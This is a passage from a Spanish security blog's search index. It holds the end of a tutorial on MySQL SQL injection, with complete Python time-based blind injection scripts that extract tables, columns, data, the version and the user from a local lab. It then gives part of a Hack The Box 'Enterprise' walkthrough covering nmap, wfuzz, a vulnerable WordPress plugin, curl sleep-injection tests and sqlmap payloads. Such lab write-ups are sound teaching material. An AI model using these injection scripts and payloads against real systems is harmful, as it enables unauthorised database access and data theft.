\u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; def tables(url,sleep_time,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Tablas\u0026#34;) tables = \u0026#34;\u0026#34; for i in range(100): payload = \u0026#34;{} and if((select count(table_name) from information_schema.tables where table_schema = \u0026#39;my_database\u0026#39;)={}, sleep({}), 1)-- -\u0026#34;.format(url,i,sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: tbs = i break for tb in range(tbs): for i in range(100): payload = \u0026#34;{} and if(LENGTH((select table_name from information_schema.tables where table_schema = \u0026#39;my_database\u0026#39; limit {}, 1))={}, sleep({}), 1)-- -\u0026#34;.format(url, tb, i, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: tb_length = i + 1 break tables += \u0026#34;\\n[*] \u0026#34; for position in range(tb_length): for char in characters: p1.status(char) payload = \u0026#34;{} and if(substr((select table_name from information_schema.tables where table_schema = \u0026#39;my_database\u0026#39; limit {},1),{},1)=\u0026#39;{}\u0026#39;,sleep({}),1)-- -\u0026#34;.format(url, tb, position, char, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: tables += char p2.status(tables) break tables(url,sleep_time,characters) Columns from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; sleep_time = 0.1 characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; def columns(url,sleep_time,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Columnas\u0026#34;) columns = \u0026#34;\u0026#34; for i in range(100): payload = \u0026#34;{} and if((select count(column_name) from information_schema.columns where table_schema = \u0026#39;my_database\u0026#39; and table_name = \u0026#39;mi_tabla\u0026#39;)={}, sleep({}), 1)-- -\u0026#34;.format(url,i,sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: cols = i break for col in range(cols): for i in range(100): payload = \u0026#34;{} and if(LENGTH((select column_name from information_schema.columns where table_schema = \u0026#39;my_database\u0026#39; and table_name = \u0026#39;mi_tabla\u0026#39; limit {}, 1))={}, sleep({}), 1)-- -\u0026#34;.format(url, col, i, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: col_length = i + 1 break columns += \u0026#34;\\n[*] \u0026#34; for position in range(col_length): for char in characters: p1.status(char) payload = \u0026#34;{} and if(substr((select column_name from information_schema.columns where table_schema = \u0026#39;my_database\u0026#39; and table_name = \u0026#39;mi_tabla\u0026#39; limit {},1),{},1)=\u0026#39;{}\u0026#39;,sleep({}),1)-- -\u0026#34;.format(url, col, position, char, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: columns += char p2.status(columns) break columns(url,sleep_time,characters) Data from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; sleep_time = 1 characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; + \u0026#34;:\u0026#34; def data(url,sleep_time,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Datos\u0026#34;) datos = \u0026#34;\u0026#34; for i in range(100): payload = \u0026#34;{} and if((select count(nombre) from my_database.mi_tabla)={}, sleep({}), 1)-- -\u0026#34;.format(url,i,sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: dts = i break for dt in range(dts): for i in range(100): payload = \u0026#34;{} and if(LENGTH((select nombre from my_database.mi_tabla limit {}, 1))={}, sleep({}), 1)-- -\u0026#34;.format(url, dt, i, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: dt_length = i + 1 break datos += \u0026#34;\\n[*] \u0026#34; for position in range(dt_length): for char in characters: p1.status(char) payload = \u0026#34;{} and if(substr((select nombre from my_database.mi_tabla limit {},1),{},1)=\u0026#39;{}\u0026#39;,sleep({}),1)-- -\u0026#34;.format(url, dt, position, char, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: datos += char p2.status(datos) break data(url,sleep_time,characters) Mas informaciÃ³n relevante version() [VersiÃ³n Base de datos]\rSELECT version(); from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; sleep_time = 1 characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; + \u0026#34;:\u0026#34; def version(url,sleep_time,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Datos\u0026#34;) versions = \u0026#34;\u0026#34; for v in range(1): for i in range(100): payload = \u0026#34;{} and if(LENGTH((select version() limit {}, 1))={}, sleep({}), 1)-- -\u0026#34;.format(url, v, i, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: v_length = i + 1 break versions += \u0026#34;\\n[*] \u0026#34; for position in range(v_length): for char in characters: p1.status(char) payload = \u0026#34;{} and if(substr((select version() limit {},1),{},1)=\u0026#39;{}\u0026#39;,sleep({}),1)-- -\u0026#34;.format(url, v, position, char, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: versions += char p2.status(versions) break version(url,sleep_time,characters) user() [Usuario que ejecuta la base de datos]\rSELECT user(); \u0026gt; python3 main.py [\u0026gt;] Probando con: 3 [*] Usuario: [*] root@172.19.0.3 from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; sleep_time = 1 characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; + \u0026#34;:\u0026#34; def user(url,sleep_time,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Usuario\u0026#34;) users = \u0026#34;\u0026#34; for user in range(1): for i in range(100): payload = \u0026#34;{} and if(LENGTH((select user() limit {}, 1))={}, sleep({}), 1)-- -\u0026#34;.format(url, user, i, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: v_length = i + 1 break users += \u0026#34;\\n[*] \u0026#34; for position in range(v_length): for char in characters: p1.status(char) payload = \u0026#34;{} and if(substr((select user() limit {},1),{},1)=\u0026#39;{}\u0026#39;,sleep({}),1)-- -\u0026#34;.format(url, user, position, char, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: users += char p2.status(users) break user(url,sleep_time,characters) database() [Base de datos en uso]\rSELECT database(); \u0026gt; python3 main.py [-] Probando con: e [ ] Base de datos en uso: [*] my_database from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; sleep_time = 1 characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; + \u0026#34;:\u0026#34; def user(url,sleep_time,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Base de datos en uso\u0026#34;) databases = \u0026#34;\u0026#34; for db in range(1): for i in range(100): payload = \u0026#34;{} and if(LENGTH((select database() limit {}, 1))={}, sleep({}), 1)-- -\u0026#34;.format(url, db, i, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: db_length = i + 1 break databases += \u0026#34;\\n[*] \u0026#34; for position in range(db_length): for char in characters: p1.status(char) payload = \u0026#34;{} and if(substr((select database() limit {},1),{},1)=\u0026#39;{}\u0026#39;,sleep({}),1)-- -\u0026#34;.format(url, db, position, char, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: databases += char p2.status(databases) break user(url,sleep_time,characters) ","date":"2023-12-19","id":39,"permalink":"/blog/aprende-sqli-mysql/","summary":"Aprende SQLI con ejemplos y contenedores docker para poner en prÃ¡ctica todo lo que vas aprendiendo, a lo largo del post aprenderÃ¡s 3 tÃ­pos de SQLI: Basadas en tiempo, Union y Boleanas","tags":["SQLI","SQL"],"title":"Aprende SQLI (MySQL)"},{"content":"","date":"2023-12-19","id":40,"permalink":"/categories/","summary":"","tags":[],"title":"Categories"},{"content":"","date":"2023-12-19","id":41,"permalink":"/categories/ciberseguridad/","summary":"","tags":[],"title":"Ciberseguridad"},{"content":"","date":"2023-12-19","id":42,"permalink":"/tags/sql/","summary":"","tags":[],"title":"SQL"},{"content":"","date":"2023-12-19","id":43,"permalink":"/tags/sqli/","summary":"","tags":[],"title":"SQLI"},{"content":"","date":"2023-11-11","id":44,"permalink":"/tags/cron/","summary":"","tags":[],"title":"Cron"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nping -c 1 10.10.10.61 PING 10.10.10.61 (10.10.10.61) 56(84) bytes of data. 64 bytes from 10.10.10.61: icmp_seq=1 ttl=63 time=94.2 ms --- 10.10.10.61 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 94.201/94.201/94.201/0.000 ms Tenemos conexiÃ³n y en este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.61 -oG allPorts ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobaciÃ³n de sÃ­ la mÃ¡quina estÃ¡ activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\nâ”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.10.61 5 â”‚ [*] Open ports: 22,80,443,8080,32812 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts bÃ¡sicos de reconocimientos de nmap\n$ nmap -sCV -p22,80,443,8080,32812 10.10.10.61 -oN versions PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA) | 256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA) |_ 256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-generator: WordPress 4.8.1 |_http-title: USS Enterprise \u0026amp;#8211; Ships Log |_http-server-header: Apache/2.4.10 (Debian) 443/tcp open ssl/http Apache httpd 2.4.25 ((Ubuntu)) |_ssl-date: TLS randomness does not represent time |_http-server-header: Apache/2.4.25 (Ubuntu) | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK | Not valid before: 2017-08-25T10:35:14 |_Not valid after: 2017-09-24T10:35:14 |_http-title: Apache2 Ubuntu Default Page: It works 8080/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-title: Home |_http-generator: Joomla! - Open Source Content Management |_http-open-proxy: Proxy might be redirecting requests |_http-server-header: Apache/2.4.10 (Debian) | http-robots.txt: 15 disallowed entries | /joomla/administrator/ /administrator/ /bin/ /cache/ | /cli/ /components/ /includes/ /installation/ /language/ |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/ 32812/tcp open unknown | fingerprint-strings: | GenericLines, GetRequest, HTTPOptions: | _______ _______ ______ _______ | |_____| |_____/ |______ | |_____ |_____ | | | _ ______| | Welcome to the Library Computer Access and Retrieval System | Enter Bridge Access Code: | Invalid Code | Terminating Console | NULL: | _______ _______ ______ _______ | |_____| |_____/ |______ | |_____ |_____ | | | _ ______| | Welcome to the Library Computer Access and Retrieval System |_ Enter Bridge Access Code: 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port32812-TCP:V=7.94%I=7%D=11/11%Time=654FAA2C%P=x86_64-pc-linux-gnu%r( SF:NULL,ED,\u0026#34;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20_______\\x20_______\\x20\\x20______\\x20_______\\n\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\|\\x20\\x20\\x20\\x20\\x20\\x20\\|\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\|_____\\|\\x20\\|_____/\\x20\\|______\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\|_____\\x20\\|_____\\x20\\x20\\|\\x20\\x20\\x20\\x20\\x20\\|\\x20\\|\\x20 SF:\\x20\\x20\\x20\\\\_\\x20______\\|\\n\\nWelcome\\x20to\\x20the\\x20Library\\x20Compu SF:ter\\x20Access\\x20and\\x20Retrieval\\x20System\\n\\nEnter\\x20Bridge\\x20Acces SF:s\\x20Code:\\x20\\n\u0026#34;)%r(GenericLines,110,\u0026#34;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_______\\x20_______\\x20\\x20______\\ SF:x20_______\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|_____\\|\\x20\\|_____/\\x20\\|______\\ SF:n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|_____\\x20\\|_____\\x20\\x20\\|\\x SF:20\\x20\\x20\\x20\\x20\\|\\x20\\|\\x20\\x20\\x20\\x20\\\\_\\x20______\\|\\n\\nWelcome\\x2 SF:0to\\x20the\\x20Library\\x20Computer\\x20Access\\x20and\\x20Retrieval\\x20Syst SF:em\\n\\nEnter\\x20Bridge\\x20Access\\x20Code:\\x20\\n\\nInvalid\\x20Code\\nTermin SF:ating\\x20Console\\n\\n\u0026#34;)%r(GetRequest,110,\u0026#34;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_______\\x20_______\\x20\\x20_____ SF:_\\x20_______\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|_____\\|\\x20\\|_____/\\x20\\|_____ SF:_\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|_____\\x20\\|_____\\x20\\x20\\| SF:\\x20\\x20\\x20\\x20\\x20\\|\\x20\\|\\x20\\x20\\x20\\x20\\\\_\\x20______\\|\\n\\nWelcome\\ SF:x20to\\x20the\\x20Library\\x20Computer\\x20Access\\x20and\\x20Retrieval\\x20Sy SF:stem\\n\\nEnter\\x20Bridge\\x20Access\\x20Code:\\x20\\n\\nInvalid\\x20Code\\nTerm SF:inating\\x20Console\\n\\n\u0026#34;)%r(HTTPOptions,110,\u0026#34;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_______\\x20_______\\x20\\x20__ SF:____\\x20_______\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|_____\\|\\x20\\|_____/\\x20\\|__ SF:____\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|_____\\x20\\|_____\\x20\\x2 SF:0\\|\\x20\\x20\\x20\\x20\\x20\\|\\x20\\|\\x20\\x20\\x20\\x20\\\\_\\x20______\\|\\n\\nWelco SF:me\\x20to\\x20the\\x20Library\\x20Computer\\x20Access\\x20and\\x20Retrieval\\x2 SF:0System\\n\\nEnter\\x20Bridge\\x20Access\\x20Code:\\x20\\n\\nInvalid\\x20Code\\nT SF:erminating\\x20Console\\n\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/ ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts bÃ¡sicos de reconocimiento -sV Proporciona la versiÃ³n e informaciÃ³n de los servicios que corren por los puertos Puerto 443 Nmap reporto que hay una web corriendo por el puerto 443. Al entrar, esta web muestra la pÃ¡gina default de apache en un ubuntu. Puede ser que existan otras rutas, asÃ­ que vamos a hacer fuzzing\nwfuzz -c -t 20 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://10.10.10.61/FUZZ ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000094: 301 9 L 28 W 312 Ch \u0026#34;files\u0026#34; ExplicaciÃ³n parÃ¡metros\r-c: Mostrar el resultado con colores -t: Definir el tiempo del escaneo \u0026ndash;hc=404: Con esto le decimos que no nos interesan las respuestas cuyo cÃ³digo de estado sea 404, lo que significa que no queremos que nos reporte pÃ¡ginas que no existen -w: Diccionario FUZZ: Es donde va a ir probando el contenido del diccionario Wfuzz ha reportado la exsistencia de un directorio llamado files. Al entrar se ve un archivo llamado lcars.zip que si lo descargamos y descomprimimos vemos que contiene 3 archivos:\nlcars.php\nEste archivo estÃ¡ vacÃ­o, no contiene cÃ³digo php, pero sÃ­ tiene unos comentarios que nos hacen pensar que es un plugin de alguna web. Podemos ver el nombre del plugin: lcars. El nombre del dominio: enterprise.htb. Y 3 comentarios: Need to create the user interface, need to finsih the db interface y need to make it secure. El Ãºltimo comentario dice que \u0026ldquo;lo tiene que hacer mÃ¡s seguro\u0026rdquo;, puede ser que el plugin sea vulnerable.\n\u0026lt;?php /* * Plugin Name: lcars * Plugin URI: enterprise.htb * Description: Library Computer Access And Retrieval System * Author: Geordi La Forge * Version: 0.2 * Author URI: enterprise.htb * */ // Need to create the user interface. // need to finsih the db interface // need to make it secure ?\u0026gt; lcars_dbpost.php\nEste archivo contiene cÃ³digo php, en el cÃ³digo se incluye el archivo /var/www/html/wp-config.php que seguramente es el que tiene las credenciales de la base de datos. DespuÃ©s hace una peticiÃ³n a la base de datos SELECT post_title FROM wp_posts WHERE ID = $query en la cual se estÃ¡n seleccionando los \u0026ldquo;post_title\u0026rdquo; de la tabla wp_posts donde el id es igual a $query y $query equivale a lo que se manda por el mÃ©todo get en el parÃ¡metro query. Antes de hacer la peticiÃ³n convierte la data que se pasa por el parÃ¡metro query a un int, un nÃºmero, lo que da a entender que estÃ¡ esperando un nÃºmero, esto no tiene pinta de ser vulnerable, ya que convierte a int la data que le pasamos.\n\u0026lt;?php include \u0026#34;/var/www/html/wp-config.php\u0026#34;; $db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME); // Test the connection: if (mysqli_connect_errno()){ // Connection Error exit(\u0026#34;Couldn\u0026#39;t connect to the database: \u0026#34;.mysqli_connect_error()); } // test to retireve a post name if (isset($_GET[\u0026#39;query\u0026#39;])){ $query = (int)$_GET[\u0026#39;query\u0026#39;]; $sql = \u0026#34;SELECT post_title FROM wp_posts WHERE ID = $query\u0026#34;; $result = $db-\u0026gt;query($sql); if ($result){ $row = $result-\u0026gt;fetch_row(); if (isset($row[0])){ echo $row[0]; } } } else { echo \u0026#34;Failed to read query\u0026#34;; } ?\u0026gt; lcars_db.php\nPor Ãºltimo el archivo lcars_db.php tambiÃ©n contiene cÃ³digo php, en el cÃ³digo se vuelve a incluir el archivo /var/www/html/wp-config.php que como dije en el anterior, seguramente es el archivo que contiene las credenciales de la base de datos. DespuÃ©s hace una peticiÃ³n a la base de datos en la cual selecciona los ID de la tabla \u0026ldquo;wp_posts\u0026rdquo; donde la columna \u0026ldquo;post_name\u0026rdquo; sea igual a $query. El script con $query se refiere a la data que le mandamos con el metodo GET por el parametro query SELECT ID FROM wp_posts WHERE post_name = $query. Este archivo cambia un poco, ya que la peticiÃ³n no es la misma y $query ya no es un nÃºmero. Al no convertir a int nuestro input, se pone directamente nuestro input en la peticiÃ³n, sin ningÃºn tipo de sanitizaciÃ³n, lo que parece que puede ser vulnerable a una SQLI\n\u0026lt;?php include \u0026#34;/var/www/html/wp-config.php\u0026#34;; $db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME); // Test the connection: if (mysqli_connect_errno()){ // Connection Error exit(\u0026#34;Couldn\u0026#39;t connect to the database: \u0026#34;.mysqli_connect_error()); } // test to retireve an ID if (isset($_GET[\u0026#39;query\u0026#39;])){ $query = $_GET[\u0026#39;query\u0026#39;]; $sql = \u0026#34;SELECT ID FROM wp_posts WHERE post_name = $query\u0026#34;; $result = $db-\u0026gt;query($sql); echo $result; } else { echo \u0026#34;Failed to read query\u0026#34;; } ?\u0026gt; enterprise.htb En el primer archivo dentro de lcars se identificÃ³ un comentario en el cual ponÃ­a un dominio:\nPlugin URI: enterprise.htb Para hacer que funcione el dominio hay que aÃ±adirlo en el /etc/hosts acompaÃ±ado de la ip de la mÃ¡quina vÃ­ctima, para quÃ© nuestra mÃ¡quina sepa a que estamos haciendo referencia cuando le hablamos del enterprise.htb.\n10.10.10.61 enterprise.htb Una vez completado este paso ya podemos entrar a la web con el dominio. Pero antes que nada vamos a hacer un whatweb para saber un poco mÃ¡s de informaciÃ³n sobre la web\nwhatweb enterprise.htb http://enterprise.htb [200 OK] Apache[2.4.10], Country[RESERVED][ZZ], Email[wordpress@example.com], HTML5, HTTPServer[Debian Linux][Apache/2.4.10 (Debian)], IP[10.10.10.61], JQuery[1.12.4], MetaGenerator[WordPress 4.8.1], PHP[5.6.31], PoweredBy[WordPress], Script[text/javascript], Title[USS Enterprise \u0026amp;#8211; Ships Log], UncommonHeaders[link], WordPress[4.8.1], X-Powered-By[PHP/5.6.31] Del resultado del whatweb podemos ver que es un Wordpress de versiÃ³n 4.8.1 (versiÃ³n bastante desactualizada)\nSabiendo que es un wordpress podemos usar la herramienta wpscan para enumerar usuarios.\nwpscan --url=http://enterprise.htb -e u [i] User(s) Identified: [+] william.riker | Found By: Author Posts - Display Name (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Login Error Messages (Aggressive Detection) [+] william-riker | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) Ha encontrado 2 posibles usuarios william.riker y william-riker, bÃ¡sicamente son el mismo usuario, pero en partes distintas de la web por lo que estÃ¡ escrito de distinta forma, debajo de william.riker pone Login Error Messages asÃ­ que vamos a suponer que el usuario es william-riker\nExplotaciÃ³n SQLI Ahora podrÃ­amos probar de ver si el plugin que se mencionaba en la otra web estÃ¡ instalado en este wordpress, para saberlo sin estar autenticados vamos a hacer lo siguiente: Los plugins en wordpress suelen estar en wp-content/plugins/ asi que lo que pode mos hacer es intentar entrar en la carpeta wp-content/plugins/lcars que deberÃ­a ser la carpeta del plugin, ya que se llama lcars. SÃ­ hacemos un curl en la carpeta nos responde con un cÃ³digo 403 Lo que significa forbidden\ncurl -o /dev/null -s -w \u0026#34;%{http_code}\\n\u0026#34; enterprise.htb/wp-content/plugins/lcars/ 403 Pero si hacemos la misma peticiÃ³n a un servidor random, nos devuelve un cÃ³digo 404, Not Found\ncurl -o /dev/null -s -w \u0026#34;%{http_code}\\n\u0026#34; enterprise.htb/wp-content/plugins/testing/ 404 Con estos dos comandos podemos sacar la conclusiÃ³n de que si existe una carpeta llamada lcars, pero no tenemos permisos para ver el contenido que hay en ella, pero jugamos con ventaja, ya que hemos visto el cÃ³digo del plugin y ya sabemos quÃ© archivos puede haber y cuÃ¡l puede ser vulnerable.\nVamos a probar de ver con curl si existe el archivo lcars_db.php que habÃ­amos visto anteriormente que parecÃ­a que podÃ­a ser vulnerable a SQLI\ncurl \u0026#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php\u0026#34; Failed to read query SÃ­ recordamos, le podÃ­amos mandar cosas por el mÃ©todo GET con el parÃ¡metro query\ncurl \u0026#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=test\u0026#34; Pero no responde con nada. Vamos a probar de aÃ±adir una inyecciÃ³n sql que lo que va a hacer es que la peticiÃ³n tarde 5 segundos en procesarse 1 and sleep(5), esto lo vamos a juntar con el comando de curl url encodeado y el comando time para que nos diga cuanto tiempo tarda en ejecutarse el comando. (Para url encodear el payload de la SQLI se puede hacer con una web o manualmente cambiando los espacios por %20 y los \u0026ldquo;()\u0026rdquo; por %28 y %29)\ntime curl \u0026#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1%20and%20sleep%285%29\u0026#34; \u0026lt;br /\u0026gt; \u0026lt;b\u0026gt;Catchable fatal error\u0026lt;/b\u0026gt;: Object of class mysqli_result could not be converted to string in \u0026lt;b\u0026gt;/var/www/html/wp-content/plugins/lcars/lcars_db.php\u0026lt;/b\u0026gt; on line \u0026lt;b\u0026gt;16\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt; real\t6.71s user\t0.00s sys\t0.01s cpu\t0% Confirmado, es vulnerable, le dijimos a la base de datos que hiciera un sleep de 5 segundos y la peticion ha tardado en llegar 6.71, lo que significa que ha funcionado\nPara automatizar la inyecciÃ³n vamos a usar la herramienta sqlmap, sqlmap es una herramienta que en algunas certificaciones como OSCP estÃ¡ prohibida, pero para esta mÃ¡quina va muy bien, ya que haciÃ©ndolo manual tardarÃ­amos mucho, muchÃ­simo!\nsqlmap --url \u0026#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1\u0026#34; --batch Parameter: query (GET) Type: boolean-based blind Title: Boolean-based blind - Parameter replace (original value) Payload: query=(SELECT (CASE WHEN (9063=9063) THEN 1 ELSE (SELECT 3395 UNION SELECT 7761) END)) Type: error-based Title: MySQL \u0026gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: query=1 AND (SELECT 6881 FROM(SELECT COUNT(*),CONCAT(0x71766b7171,(SELECT (ELT(6881=6881,1))),0x71706a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: query=1 AND (SELECT 1921 FROM (SELECT(SLEEP(5)))CmQp) Sqlmap nos confirma que es vulnerable y nos dice los 3 tipos de SQLI que se pueden usar\nboolean-based blind error-based time-based blind Para enumerar las bases de datos vamos a usar el parÃ¡metro --dbs\nsqlmap 